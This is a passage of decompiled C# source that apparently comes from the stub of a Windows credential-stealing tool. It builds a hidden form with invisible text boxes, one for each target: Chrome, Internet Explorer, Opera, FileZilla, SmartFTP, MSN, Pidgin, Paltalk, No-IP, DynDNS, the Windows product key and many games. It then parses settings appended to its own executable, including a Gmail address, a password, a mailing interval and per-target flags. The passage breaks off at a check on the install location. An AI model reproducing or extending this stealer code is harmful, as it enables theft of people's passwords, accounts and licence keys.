    point1 = new Point(0, 208);
    Point point13 = point1;
    msnt1.Location = point13;
    this.msnt.Name = "msnt";
    RichTextBox msnt2 = this.msnt;
    size1 = new Size(10, 10);
    Size size13 = size1;
    msnt2.Size = size13;
    this.msnt.TabIndex = 13;
    this.msnt.Text = "";
    this.msnt.Visible = false;
    this.paltalkt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox paltalkt1 = this.paltalkt;
    point1 = new Point(0, 224);
    Point point14 = point1;
    paltalkt1.Location = point14;
    this.paltalkt.Name = "paltalkt";
    RichTextBox paltalkt2 = this.paltalkt;
    size1 = new Size(10, 10);
    Size size14 = size1;
    paltalkt2.Size = size14;
    this.paltalkt.TabIndex = 14;
    this.paltalkt.Text = "";
    this.paltalkt.Visible = false;
    this.pidgint.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox pidgint1 = this.pidgint;
    point1 = new Point(0, 240);
    Point point15 = point1;
    pidgint1.Location = point15;
    this.pidgint.Name = "pidgint";
    RichTextBox pidgint2 = this.pidgint;
    size1 = new Size(10, 10);
    Size size15 = size1;
    pidgint2.Size = size15;
    this.pidgint.TabIndex = 15;
    this.pidgint.Text = "";
    this.pidgint.Visible = false;
    this.internetexplorert.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox internetexplorert1 = this.internetexplorert;
    point1 = new Point(16, 0);
    Point point16 = point1;
    internetexplorert1.Location = point16;
    this.internetexplorert.Name = "internetexplorert";
    RichTextBox internetexplorert2 = this.internetexplorert;
    size1 = new Size(10, 10);
    Size size16 = size1;
    internetexplorert2.Size = size16;
    this.internetexplorert.TabIndex = 16;
    this.internetexplorert.Text = "";
    this.internetexplorert.Visible = false;
    this.operat.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox operat1 = this.operat;
    point1 = new Point(16, 16);
    Point point17 = point1;
    operat1.Location = point17;
    this.operat.Name = "operat";
    RichTextBox operat2 = this.operat;
    size1 = new Size(10, 10);
    Size size17 = size1;
    operat2.Size = size17;
    this.operat.TabIndex = 17;
    this.operat.Text = "";
    this.operat.Visible = false;
    this.actofwart.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox actofwart1 = this.actofwart;
    point1 = new Point(16, 32);
    Point point18 = point1;
    actofwart1.Location = point18;
    this.actofwart.Name = "actofwart";
    RichTextBox actofwart2 = this.actofwart;
    size1 = new Size(10, 10);
    Size size18 = size1;
    actofwart2.Size = size18;
    this.actofwart.TabIndex = 18;
    this.actofwart.Text = "";
    this.actofwart.Visible = false;
    this.anno1701t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox anno1701t1 = this.anno1701t;
    point1 = new Point(16, 48);
    Point point19 = point1;
    anno1701t1.Location = point19;
    this.anno1701t.Name = "anno1701t";
    RichTextBox anno1701t2 = this.anno1701t;
    size1 = new Size(10, 10);
    Size size19 = size1;
    anno1701t2.Size = size19;
    this.anno1701t.TabIndex = 19;
    this.anno1701t.Text = "";
    this.anno1701t.Visible = false;
    this.battlefield1942t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox battlefield1942t1 = this.battlefield1942t;
    point1 = new Point(16, 64);
    Point point20 = point1;
    battlefield1942t1.Location = point20;
    this.battlefield1942t.Name = "battlefield1942t";
    RichTextBox battlefield1942t2 = this.battlefield1942t;
    size1 = new Size(10, 10);
    Size size20 = size1;
    battlefield1942t2.Size = size20;
    this.battlefield1942t.TabIndex = 20;
    this.battlefield1942t.Text = "";
    this.battlefield1942t.Visible = false;
    this.battlefield2t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox battlefield2t1 = this.battlefield2t;
    point1 = new Point(16, 80);
    Point point21 = point1;
    battlefield2t1.Location = point21;
    this.battlefield2t.Name = "battlefield2t";
    RichTextBox battlefield2t2 = this.battlefield2t;
    size1 = new Size(10, 10);
    Size size21 = size1;
    battlefield2t2.Size = size21;
    this.battlefield2t.TabIndex = 21;
    this.battlefield2t.Text = "";
    this.battlefield2t.Visible = false;
    this.battlefield2142t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox battlefield2142t1 = this.battlefield2142t;
    point1 = new Point(16, 96);
    Point point22 = point1;
    battlefield2142t1.Location = point22;
    this.battlefield2142t.Name = "battlefield2142t";
    RichTextBox battlefield2142t2 = this.battlefield2142t;
    size1 = new Size(10, 10);
    Size size22 = size1;
    battlefield2142t2.Size = size22;
    this.battlefield2142t.TabIndex = 22;
    this.battlefield2142t.Text = "";
    this.battlefield2142t.Visible = false;
    this.battlefieldvietnamt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox battlefieldvietnamt1 = this.battlefieldvietnamt;
    point1 = new Point(16, 112);
    Point point23 = point1;
    battlefieldvietnamt1.Location = point23;
    this.battlefieldvietnamt.Name = "battlefieldvietnamt";
    RichTextBox battlefieldvietnamt2 = this.battlefieldvietnamt;
    size1 = new Size(10, 10);
    Size size23 = size1;
    battlefieldvietnamt2.Size = size23;
    this.battlefieldvietnamt.TabIndex = 23;
    this.battlefieldvietnamt.Text = "";
    this.battlefieldvietnamt.Visible = false;
    this.blackandwhitet.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox blackandwhitet1 = this.blackandwhitet;
    point1 = new Point(16, 128);
    Point point24 = point1;
    blackandwhitet1.Location = point24;
    this.blackandwhitet.Name = "blackandwhitet";
    RichTextBox blackandwhitet2 = this.blackandwhitet;
    size1 = new Size(10, 10);
    Size size24 = size1;
    blackandwhitet2.Size = size24;
    this.blackandwhitet.TabIndex = 24;
    this.blackandwhitet.Text = "";
    this.blackandwhitet.Visible = false;
    this.blackandwhitet2t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox blackandwhitet2t1 = this.blackandwhitet2t;
    point1 = new Point(16, 144);
    Point point25 = point1;
    blackandwhitet2t1.Location = point25;
    this.blackandwhitet2t.Name = "blackandwhitet2t";
    RichTextBox blackandwhitet2t2 = this.blackandwhitet2t;
    size1 = new Size(10, 10);
    Size size25 = size1;
    blackandwhitet2t2.Size = size25;
    this.blackandwhitet2t.TabIndex = 25;
    this.blackandwhitet2t.Text = "";
    this.blackandwhitet2t.Visible = false;
    this.callofdutyt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox callofdutyt1 = this.callofdutyt;
    point1 = new Point(16, 160);
    Point point26 = point1;
    callofdutyt1.Location = point26;
    this.callofdutyt.Name = "callofdutyt";
    RichTextBox callofdutyt2 = this.callofdutyt;
    size1 = new Size(10, 10);
    Size size26 = size1;
    callofdutyt2.Size = size26;
    this.callofdutyt.TabIndex = 26;
    this.callofdutyt.Text = "";
    this.callofdutyt.Visible = false;
    this.callofduty2t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox callofduty2t1 = this.callofduty2t;
    point1 = new Point(16, 176);
    Point point27 = point1;
    callofduty2t1.Location = point27;
    this.callofduty2t.Name = "callofduty2t";
    RichTextBox callofduty2t2 = this.callofduty2t;
    size1 = new Size(10, 10);
    Size size27 = size1;
    callofduty2t2.Size = size27;
    this.callofduty2t.TabIndex = 27;
    this.callofduty2t.Text = "";
    this.callofduty2t.Visible = false;
    this.callofduty4t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox callofduty4t1 = this.callofduty4t;
    point1 = new Point(16, 192);
    Point point28 = point1;
    callofduty4t1.Location = point28;
    this.callofduty4t.Name = "callofduty4t";
    RichTextBox callofduty4t2 = this.callofduty4t;
    size1 = new Size(10, 10);
    Size size28 = size1;
    callofduty4t2.Size = size28;
    this.callofduty4t.TabIndex = 28;
    this.callofduty4t.Text = "";
    this.callofduty4t.Visible = false;
    this.callofduty5t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox callofduty5t1 = this.callofduty5t;
    point1 = new Point(16, 208);
    Point point29 = point1;
    callofduty5t1.Location = point29;
    this.callofduty5t.Name = "callofduty5t";
    RichTextBox callofduty5t2 = this.callofduty5t;
    size1 = new Size(10, 10);
    Size size29 = size1;
    callofduty5t2.Size = size29;
    this.callofduty5t.TabIndex = 29;
    this.callofduty5t.Text = "";
    this.callofduty5t.Visible = false;
    this.cacgeneralst.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox cacgeneralst1 = this.cacgeneralst;
    point1 = new Point(16, 224);
    Point point30 = point1;
    cacgeneralst1.Location = point30;
    this.cacgeneralst.Name = "cacgeneralst";
    RichTextBox cacgeneralst2 = this.cacgeneralst;
    size1 = new Size(10, 10);
    Size size30 = size1;
    cacgeneralst2.Size = size30;
    this.cacgeneralst.TabIndex = 30;
    this.cacgeneralst.Text = "";
    this.cacgeneralst.Visible = false;
    this.cacgeneralzerohourt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox cacgeneralzerohourt1 = this.cacgeneralzerohourt;
    point1 = new Point(16, 240);
    Point point31 = point1;
    cacgeneralzerohourt1.Location = point31;
    this.cacgeneralzerohourt.Name = "cacgeneralzerohourt";
    RichTextBox cacgeneralzerohourt2 = this.cacgeneralzerohourt;
    size1 = new Size(10, 10);
    Size size31 = size1;
    cacgeneralzerohourt2.Size = size31;
    this.cacgeneralzerohourt.TabIndex = 31;
    this.cacgeneralzerohourt.Text = "";
    this.cacgeneralzerohourt.Visible = false;
    this.cactst.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox cactst1 = this.cactst;
    point1 = new Point(32, 0);
    Point point32 = point1;
    cactst1.Location = point32;
    this.cactst.Name = "cactst";
    RichTextBox cactst2 = this.cactst;
    size1 = new Size(10, 10);
    Size size32 = size1;
    cactst2.Size = size32;
    this.cactst.TabIndex = 32;
    this.cactst.Text = "";
    this.cactst.Visible = false;
    this.cacrat.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox cacrat1 = this.cacrat;
    point1 = new Point(32, 16);
    Point point33 = point1;
    cacrat1.Location = point33;
    this.cacrat.Name = "cacrat";
    RichTextBox cacrat2 = this.cacrat;
    size1 = new Size(10, 10);
    Size size33 = size1;
    cacrat2.Size = size33;
    this.cacrat.TabIndex = 33;
    this.cacrat.Text = "";
    this.cacrat.Visible = false;
    this.cacra2t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox cacra2t1 = this.cacra2t;
    point1 = new Point(32, 32);
    Point point34 = point1;
    cacra2t1.Location = point34;
    this.cacra2t.Name = "cacra2t";
    RichTextBox cacra2t2 = this.cacra2t;
    size1 = new Size(10, 10);
    Size size34 = size1;
    cacra2t2.Size = size34;
    this.cacra2t.TabIndex = 34;
    this.cacra2t.Text = "";
    this.cacra2t.Visible = false;
    this.cacra2yt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox cacra2yt1 = this.cacra2yt;
    point1 = new Point(32, 48);
    Point point35 = point1;
    cacra2yt1.Location = point35;
    this.cacra2yt.Name = "cacra2yt";
    RichTextBox cacra2yt2 = this.cacra2yt;
    size1 = new Size(10, 10);
    Size size35 = size1;
    cacra2yt2.Size = size35;
    this.cacra2yt.TabIndex = 35;
    this.cacra2yt.Text = "";
    this.cacra2yt.Visible = false;
    this.cac3twt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox cac3twt1 = this.cac3twt;
    point1 = new Point(32, 64);
    Point point36 = point1;
    cac3twt1.Location = point36;
    this.cac3twt.Name = "cac3twt";
    RichTextBox cac3twt2 = this.cac3twt;
    size1 = new Size(10, 10);
    Size size36 = size1;
    cac3twt2.Size = size36;
    this.cac3twt.TabIndex = 36;
    this.cac3twt.Text = "";
    this.cac3twt.Visible = false;
    this.companyofheroest.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox companyofheroest1 = this.companyofheroest;
    point1 = new Point(32, 80);
    Point point37 = point1;
    companyofheroest1.Location = point37;
    this.companyofheroest.Name = "companyofheroest";
    RichTextBox companyofheroest2 = this.companyofheroest;
    size1 = new Size(10, 10);
    Size size37 = size1;
    companyofheroest2.Size = size37;
    this.companyofheroest.TabIndex = 37;
    this.companyofheroest.Text = "";
    this.companyofheroest.Visible = false;
    this.crysist.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox crysist1 = this.crysist;
    point1 = new Point(32, 96);
    Point point38 = point1;
    crysist1.Location = point38;
    this.crysist.Name = "crysist";
    RichTextBox crysist2 = this.crysist;
    size1 = new Size(10, 10);
    Size size38 = size1;
    crysist2.Size = size38;
    this.crysist.TabIndex = 38;
    this.crysist.Text = "";
    this.crysist.Visible = false;
    this.techlandt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox techlandt1 = this.techlandt;
    point1 = new Point(32, 112);
    Point point39 = point1;
    techlandt1.Location = point39;
    this.techlandt.Name = "techlandt";
    RichTextBox techlandt2 = this.techlandt;
    size1 = new Size(10, 10);
    Size size39 = size1;
    techlandt2.Size = size39;
    this.techlandt.TabIndex = 39;
    this.techlandt.Text = "";
    this.techlandt.Visible = false;
    this.farcryt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox farcryt1 = this.farcryt;
    point1 = new Point(32, 128);
    Point point40 = point1;
    farcryt1.Location = point40;
    this.farcryt.Name = "farcryt";
    RichTextBox farcryt2 = this.farcryt;
    size1 = new Size(10, 10);
    Size size40 = size1;
    farcryt2.Size = size40;
    this.farcryt.TabIndex = 40;
    this.farcryt.Text = "";
    this.farcryt.Visible = false;
    this.farcry2t.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox farcry2t1 = this.farcry2t;
    point1 = new Point(32, 144);
    Point point41 = point1;
    farcry2t1.Location = point41;
    this.farcry2t.Name = "farcry2t";
    RichTextBox farcry2t2 = this.farcry2t;
    size1 = new Size(10, 10);
    Size size41 = size1;
    farcry2t2.Size = size41;
    this.farcry2t.TabIndex = 41;
    this.farcry2t.Text = "";
    this.farcry2t.Visible = false;
    this.feart.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox feart1 = this.feart;
    point1 = new Point(32, 160);
    Point point42 = point1;
    feart1.Location = point42;
    this.feart.Name = "feart";
    RichTextBox feart2 = this.feart;
    size1 = new Size(10, 10);
    Size size42 = size1;
    feart2.Size = size42;
    this.feart.TabIndex = 42;
    this.feart.Text = "";
    this.feart.Visible = false;
    this.fifat.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox fifat1 = this.fifat;
    point1 = new Point(32, 176);
    Point point43 = point1;
    fifat1.Location = point43;
    this.fifat.Name = "fifat";
    RichTextBox fifat2 = this.fifat;
    size1 = new Size(10, 10);
    Size size43 = size1;
    fifat2.Size = size43;
    this.fifat.TabIndex = 43;
    this.fifat.Text = "";
    this.fifat.Visible = false;
    this.frontlinest.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox frontlinest1 = this.frontlinest;
    point1 = new Point(32, 192);
    Point point44 = point1;
    frontlinest1.Location = point44;
    this.frontlinest.Name = "frontlinest";
    RichTextBox frontlinest2 = this.frontlinest;
    size1 = new Size(10, 10);
    Size size44 = size1;
    frontlinest2.Size = size44;
    this.frontlinest.TabIndex = 44;
    this.frontlinest.Text = "";
    this.frontlinest.Visible = false;
    this.hellgatet.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox hellgatet1 = this.hellgatet;
    point1 = new Point(32, 208);
    Point point45 = point1;
    hellgatet1.Location = point45;
    this.hellgatet.Name = "hellgatet";
    RichTextBox hellgatet2 = this.hellgatet;
    size1 = new Size(10, 10);
    Size size45 = size1;
    hellgatet2.Size = size45;
    this.hellgatet.TabIndex = 45;
    this.hellgatet.Text = "";
    this.hellgatet.Visible = false;
    this.mohat.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox mohat1 = this.mohat;
    point1 = new Point(32, 224);
    Point point46 = point1;
    mohat1.Location = point46;
    this.mohat.Name = "mohat";
    RichTextBox mohat2 = this.mohat;
    size1 = new Size(10, 10);
    Size size46 = size1;
    mohat2.Size = size46;
    this.mohat.TabIndex = 46;
    this.mohat.Text = "";
    this.mohat.Visible = false;
    this.mohaat.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox mohaat1 = this.mohaat;
    point1 = new Point(32, 240);
    Point point47 = point1;
    mohaat1.Location = point47;
    this.mohaat.Name = "mohaat";
    RichTextBox mohaat2 = this.mohaat;
    size1 = new Size(10, 10);
    Size size47 = size1;
    mohaat2.Size = size47;
    this.mohaat.TabIndex = 47;
    this.mohaat.Text = "";
    this.mohaat.Visible = false;
    this.mohaabt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox mohaabt1 = this.mohaabt;
    point1 = new Point(48, 0);
    Point point48 = point1;
    mohaabt1.Location = point48;
    this.mohaabt.Name = "mohaabt";
    RichTextBox mohaabt2 = this.mohaabt;
    size1 = new Size(10, 10);
    Size size48 = size1;
    mohaabt2.Size = size48;
    this.mohaabt.TabIndex = 48;
    this.mohaabt.Text = "";
    this.mohaabt.Visible = false;
    this.mohaast.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox mohaast1 = this.mohaast;
    point1 = new Point(48, 16);
    Point point49 = point1;
    mohaast1.Location = point49;
    this.mohaast.Name = "mohaast";
    RichTextBox mohaast2 = this.mohaast;
    size1 = new Size(10, 10);
    Size size49 = size1;
    mohaast2.Size = size49;
    this.mohaast.TabIndex = 49;
    this.mohaast.Text = "";
    this.mohaast.Visible = false;
    this.nbat.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox nbat1 = this.nbat;
    point1 = new Point(48, 32);
    Point point50 = point1;
    nbat1.Location = point50;
    this.nbat.Name = "nbat";
    RichTextBox nbat2 = this.nbat;
    size1 = new Size(10, 10);
    Size size50 = size1;
    nbat2.Size = size50;
    this.nbat.TabIndex = 50;
    this.nbat.Text = "";
    this.nbat.Visible = false;
    this.nfsut.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox nfsut1 = this.nfsut;
    point1 = new Point(48, 48);
    Point point51 = point1;
    nfsut1.Location = point51;
    this.nfsut.Name = "nfsut";
    RichTextBox nfsut2 = this.nfsut;
    size1 = new Size(10, 10);
    Size size51 = size1;
    nfsut2.Size = size51;
    this.nfsut.TabIndex = 51;
    this.nfsut.Text = "";
    this.nfsut.Visible = false;
    this.nfsut2.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox nfsut2_1 = this.nfsut2;
    point1 = new Point(48, 64);
    Point point52 = point1;
    nfsut2_1.Location = point52;
    this.nfsut2.Name = "nfsut2";
    RichTextBox nfsut2_2 = this.nfsut2;
    size1 = new Size(10, 10);
    Size size52 = size1;
    nfsut2_2.Size = size52;
    this.nfsut2.TabIndex = 52;
    this.nfsut2.Text = "";
    this.nfsut2.Visible = false;
    this.nfsct.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox nfsct1 = this.nfsct;
    point1 = new Point(48, 80);
    Point point53 = point1;
    nfsct1.Location = point53;
    this.nfsct.Name = "nfsct";
    RichTextBox nfsct2 = this.nfsct;
    size1 = new Size(10, 10);
    Size size53 = size1;
    nfsct2.Size = size53;
    this.nfsct.TabIndex = 53;
    this.nfsct.Text = "";
    this.nfsct.Visible = false;
    this.nfsmwt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox nfsmwt1 = this.nfsmwt;
    point1 = new Point(48, 96);
    Point point54 = point1;
    nfsmwt1.Location = point54;
    this.nfsmwt.Name = "nfsmwt";
    RichTextBox nfsmwt2 = this.nfsmwt;
    size1 = new Size(10, 10);
    Size size54 = size1;
    nfsmwt2.Size = size54;
    this.nfsmwt.TabIndex = 54;
    this.nfsmwt.Text = "";
    this.nfsmwt.Visible = false;
    this.nfspst.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox nfspst1 = this.nfspst;
    point1 = new Point(48, 112);
    Point point55 = point1;
    nfspst1.Location = point55;
    this.nfspst.Name = "nfspst";
    RichTextBox nfspst2 = this.nfspst;
    size1 = new Size(10, 10);
    Size size55 = size1;
    nfspst2.Size = size55;
    this.nfspst.TabIndex = 55;
    this.nfspst.Text = "";
    this.nfspst.Visible = false;
    this.quaket.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox quaket1 = this.quaket;
    point1 = new Point(48, 128);
    Point point56 = point1;
    quaket1.Location = point56;
    this.quaket.Name = "quaket";
    RichTextBox quaket2 = this.quaket;
    size1 = new Size(10, 10);
    Size size56 = size1;
    quaket2.Size = size56;
    this.quaket.TabIndex = 56;
    this.quaket.Text = "";
    this.quaket.Visible = false;
    this.stalkert.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox stalkert1 = this.stalkert;
    point1 = new Point(48, 144);
    Point point57 = point1;
    stalkert1.Location = point57;
    this.stalkert.Name = "stalkert";
    RichTextBox stalkert2 = this.stalkert;
    size1 = new Size(10, 10);
    Size size57 = size1;
    stalkert2.Size = size57;
    this.stalkert.TabIndex = 57;
    this.stalkert.Text = "";
    this.stalkert.Visible = false;
    this.swatt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox swatt1 = this.swatt;
    point1 = new Point(48, 160);
    Point point58 = point1;
    swatt1.Location = point58;
    this.swatt.Name = "swatt";
    RichTextBox swatt2 = this.swatt;
    size1 = new Size(10, 10);
    Size size58 = size1;
    swatt2.Size = size58;
    this.swatt.TabIndex = 58;
    this.swatt.Text = "";
    this.swatt.Visible = false;
    this.unrealt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox unrealt1 = this.unrealt;
    point1 = new Point(0, 32);
    Point point59 = point1;
    unrealt1.Location = point59;
    this.unrealt.Name = "unrealt";
    RichTextBox unrealt2 = this.unrealt;
    size1 = new Size(10, 10);
    Size size59 = size1;
    unrealt2.Size = size59;
    this.unrealt.TabIndex = 59;
    this.unrealt.Text = "";
    this.unrealt.Visible = false;
    this.filezillat.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox filezillat1 = this.filezillat;
    point1 = new Point(0, 48);
    Point point60 = point1;
    filezillat1.Location = point60;
    this.filezillat.Name = "filezillat";
    RichTextBox filezillat2 = this.filezillat;
    size1 = new Size(10, 10);
    Size size60 = size1;
    filezillat2.Size = size60;
    this.filezillat.TabIndex = 61;
    this.filezillat.Text = "";
    this.filezillat.Visible = false;
    this.ii.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox ii1 = this.ii;
    point1 = new Point(48, 176);
    Point point61 = point1;
    ii1.Location = point61;
    this.ii.Name = "ii";
    RichTextBox ii2 = this.ii;
    size1 = new Size(10, 10);
    Size size61 = size1;
    ii2.Size = size61;
    this.ii.TabIndex = 62;
    this.ii.Text = "0";
    this.ii.Visible = false;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    size1 = new Size(121, 8);
    this.ClientSize = size1;
    this.ControlBox = false;
    this.Controls.Add((Control) this.ii);
    this.Controls.Add((Control) this.filezillat);
    this.Controls.Add((Control) this.unrealt);
    this.Controls.Add((Control) this.swatt);
    this.Controls.Add((Control) this.stalkert);
    this.Controls.Add((Control) this.quaket);
    this.Controls.Add((Control) this.nfspst);
    this.Controls.Add((Control) this.nfsmwt);
    this.Controls.Add((Control) this.nfsct);
    this.Controls.Add((Control) this.nfsut2);
    this.Controls.Add((Control) this.nfsut);
    this.Controls.Add((Control) this.nbat);
    this.Controls.Add((Control) this.mohaast);
    this.Controls.Add((Control) this.mohaabt);
    this.Controls.Add((Control) this.mohaat);
    this.Controls.Add((Control) this.mohat);
    this.Controls.Add((Control) this.hellgatet);
    this.Controls.Add((Control) this.frontlinest);
    this.Controls.Add((Control) this.fifat);
    this.Controls.Add((Control) this.feart);
    this.Controls.Add((Control) this.farcry2t);
    this.Controls.Add((Control) this.farcryt);
    this.Controls.Add((Control) this.techlandt);
    this.Controls.Add((Control) this.crysist);
    this.Controls.Add((Control) this.companyofheroest);
    this.Controls.Add((Control) this.cac3twt);
    this.Controls.Add((Control) this.cacra2yt);
    this.Controls.Add((Control) this.cacra2t);
    this.Controls.Add((Control) this.cacrat);
    this.Controls.Add((Control) this.cactst);
    this.Controls.Add((Control) this.cacgeneralzerohourt);
    this.Controls.Add((Control) this.cacgeneralst);
    this.Controls.Add((Control) this.callofduty5t);
    this.Controls.Add((Control) this.callofduty4t);
    this.Controls.Add((Control) this.callofduty2t);
    this.Controls.Add((Control) this.callofdutyt);
    this.Controls.Add((Control) this.blackandwhitet2t);
    this.Controls.Add((Control) this.blackandwhitet);
    this.Controls.Add((Control) this.battlefieldvietnamt);
    this.Controls.Add((Control) this.battlefield2142t);
    this.Controls.Add((Control) this.battlefield2t);
    this.Controls.Add((Control) this.battlefield1942t);
    this.Controls.Add((Control) this.anno1701t);
    this.Controls.Add((Control) this.actofwart);
    this.Controls.Add((Control) this.operat);
    this.Controls.Add((Control) this.internetexplorert);
    this.Controls.Add((Control) this.pidgint);
    this.Controls.Add((Control) this.paltalkt);
    this.Controls.Add((Control) this.msnt);
    this.Controls.Add((Control) this.imvut);
    this.Controls.Add((Control) this.valvet);
    this.Controls.Add((Control) this.windowskeyt);
    this.Controls.Add((Control) this.dyndnst);
    this.Controls.Add((Control) this.noipt);
    this.Controls.Add((Control) this.smartftpt);
    this.Controls.Add((Control) this.coreftpt);
    this.Controls.Add((Control) this.SFlashFxpt);
    this.Controls.Add((Control) this.scommandert);
    this.Controls.Add((Control) this.genel);
    this.Controls.Add((Control) this.chromet);
    this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = "Form1";
    this.ShowInTaskbar = false;
    this.ResumeLayout(false);
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  private void Form1_Load(object sender, EventArgs e)
  {
    FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
    this.stub = Strings.Space(checked ((int) FileSystem.LOF(1)));
    FileSystem.FileGet(1, ref this.stub, -1L, false);
    FileSystem.FileClose(1);
    this.opt = Strings.Split(this.stub, "|batu|", -1, CompareMethod.Binary);
    this.gmail = this.opt[1];
    this.sifre = this.opt[2];
    this.dk = this.opt[3];
    this.baslik = this.opt[4];
    this.mesaj = this.opt[5];
    this.chrome = Conversions.ToInteger(this.opt[6]);
    this.coreftp = Conversions.ToInteger(this.opt[7]);
    this.dyndns = Conversions.ToInteger(this.opt[8]);
    this.filezilla = Conversions.ToInteger(this.opt[9]);
    this.flashfxp = Conversions.ToInteger(this.opt[10]);
    this.ftpcommander = Conversions.ToInteger(this.opt[11]);
    this.imvu = Conversions.ToInteger(this.opt[12]);
    this.msn = Conversions.ToInteger(this.opt[13]);
    this.noip = Conversions.ToInteger(this.opt[14]);
    this.paltalk = Conversions.ToInteger(this.opt[15]);
    this.pidgin = Conversions.ToInteger(this.opt[16]);
    this.smartftp = Conversions.ToInteger(this.opt[17]);
    this.internetexplorer = Conversions.ToInteger(this.opt[18]);
    this.firefox = Conversions.ToInteger(this.opt[19]);
    this.opera = Conversions.ToInteger(this.opt[20]);
    this.windowskey = Conversions.ToInteger(this.opt[21]);
    this.valve = Conversions.ToInteger(this.opt[22]);
    this.actofwar = Conversions.ToInteger(this.opt[23]);
    this.anno1701 = Conversions.ToInteger(this.opt[24]);
    this.battlefield1942 = Conversions.ToInteger(this.opt[25]);
    this.battlefield2 = Conversions.ToInteger(this.opt[26]);
    this.battlefield2142 = Conversions.ToInteger(this.opt[27]);
    this.battlefieldvietnam = Conversions.ToInteger(this.opt[28]);
    this.blackandwhite = Conversions.ToInteger(this.opt[29]);
    this.blackandwhite2 = Conversions.ToInteger(this.opt[30]);
    this.callofduty = Conversions.ToInteger(this.opt[31]);
    this.callofduty2 = Conversions.ToInteger(this.opt[32]);
    this.callofduty4 = Conversions.ToInteger(this.opt[33]);
    this.callofduty5 = Conversions.ToInteger(this.opt[34]);
    this.cacgenerals = Conversions.ToInteger(this.opt[35]);
    this.cacgeneralszerohour = Conversions.ToInteger(this.opt[36]);
    this.cactiberiansun = Conversions.ToInteger(this.opt[37]);
    this.cacredalert = Conversions.ToInteger(this.opt[38]);
    this.cacredalert2 = Conversions.ToInteger(this.opt[39]);
    this.cacredalert2yuri = Conversions.ToInteger(this.opt[40]);
    this.cac3tiberiumwars = Conversions.ToInteger(this.opt[41]);
    this.companyofheroes = Conversions.ToInteger(this.opt[42]);
    this.crysis = Conversions.ToInteger(this.opt[43]);
    this.techland = Conversions.ToInteger(this.opt[44]);
    this.farcry = Conversions.ToInteger(this.opt[45]);
    this.farcry2 = Conversions.ToInteger(this.opt[46]);
    this.fear = Conversions.ToInteger(this.opt[47]);
    this.fifa08 = Conversions.ToInteger(this.opt[48]);
    this.frontlinesfuelofwar = Conversions.ToInteger(this.opt[49]);
    this.hellgatelondon = Conversions.ToInteger(this.opt[50]);
    this.mohairborne = Conversions.ToInteger(this.opt[51]);
    this.mohalliedassault = Conversions.ToInteger(this.opt[52]);
    this.mohaabreakth = Conversions.ToInteger(this.opt[53]);
    this.mohaaspearhe = Conversions.ToInteger(this.opt[54]);
    this.nba08 = Conversions.ToInteger(this.opt[55]);
    this.nfsunderground = Conversions.ToInteger(this.opt[56]);
    this.nfsunderground2 = Conversions.ToInteger(this.opt[57]);
    this.nfscarbon = Conversions.ToInteger(this.opt[58]);
    this.nfsmostwanted = Conversions.ToInteger(this.opt[59]);
    this.nfsprostreet = Conversions.ToInteger(this.opt[60]);
    this.quake4 = Conversions.ToInteger(this.opt[61]);
    this.stalkersoc = Conversions.ToInteger(this.opt[62]);
    this.swat4 = Conversions.ToInteger(this.opt[63]);
    this.unrealt2004 = Conversions.ToInteger(this.opt[64]);
    this.minecraft = Conversions.ToInteger(this.opt[65]);
    if (Conversions.ToDouble(MySettingsProperty.Settings.girdi) != 1.0 && Strings.InStr(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), CompareMethod.Binary) == 0)
    {
